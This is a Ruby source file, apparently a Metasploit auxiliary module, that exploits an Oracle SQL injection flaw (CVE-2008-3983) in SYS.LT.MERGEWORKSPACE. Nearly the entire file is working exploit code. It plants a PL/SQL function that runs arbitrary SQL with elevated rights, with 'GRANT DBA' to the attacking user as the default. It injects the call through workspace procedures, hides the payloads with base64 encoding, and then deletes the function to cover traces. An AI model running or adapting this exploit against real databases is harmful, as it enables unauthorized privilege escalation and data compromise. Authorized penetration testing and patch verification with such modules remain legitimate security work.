##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle DB SQL Injection via SYS.LT.MERGEWORKSPACE',
      'Description'    => %q{
        This module exploits a sql injection flaw in the MERGEWORKSPACE
        procedure of the PL/SQL package SYS.LT. Any user with execute
        privilege on the vulnerable package can exploit this vulnerability.
      },
      'Author'         => [ 'CG' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-3983'],
          [ 'OSVDB', '49325'],
          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2008.html' ],
          [ 'URL', 'http://www.dsecrg.com/pages/expl/show.php?id=23' ]

        ],
      'DisclosureDate' => '2008-10-22'))

      register_options(
        [
          OptString.new('SQL', [ false, 'SQL to execte.',  "GRANT DBA to #{datastore['DBUSER']}"]),
        ])
  end

  def run
    return if not check_dependencies

    name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
    rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
    rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
    rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
    cruft = Rex::Text.rand_text_alpha_upper(1)

    function = "
      CREATE OR REPLACE FUNCTION #{cruft}
      RETURN VARCHAR2 AUTHID CURRENT_USER
      AS
      PRAGMA AUTONOMOUS_TRANSACTION;
      BEGIN
      EXECUTE IMMEDIATE '#{datastore['SQL']}';
      COMMIT;
      RETURN '#{cruft}';
      END;"

    package1 = %Q|
      BEGIN
        SYS.LT.CREATEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}');
      END;
      |

    package2 = %Q|
      BEGIN
        SYS.LT.MERGEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}');
      END;
      |

    uno  = Rex::Text.encode_base64(function)
    dos  = Rex::Text.encode_base64(package1)
    tres = Rex::Text.encode_base64(package2)

    sql = %Q|
      DECLARE
      #{rand1} VARCHAR2(32767);
      #{rand2} VARCHAR2(32767);
      #{rand3} VARCHAR2(32767);
      BEGIN
      #{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{uno}')));
      EXECUTE IMMEDIATE #{rand1};
      #{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{dos}')));
      EXECUTE IMMEDIATE #{rand2};
      #{rand3} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{tres}')));
      EXECUTE IMMEDIATE #{rand3};
      END;
      |

    clean = "DROP FUNCTION #{cruft}"

    # Try first, if it's good.. keep doing the dance.
    print_status("Attempting sql injection on SYS.LT.MERGEWORKSPACE...")
    begin
      prepare_exec(sql)
    rescue => e
      return
    end

    print_status("Removing function '#{cruft}'...")
    prepare_exec(clean)

  end
end
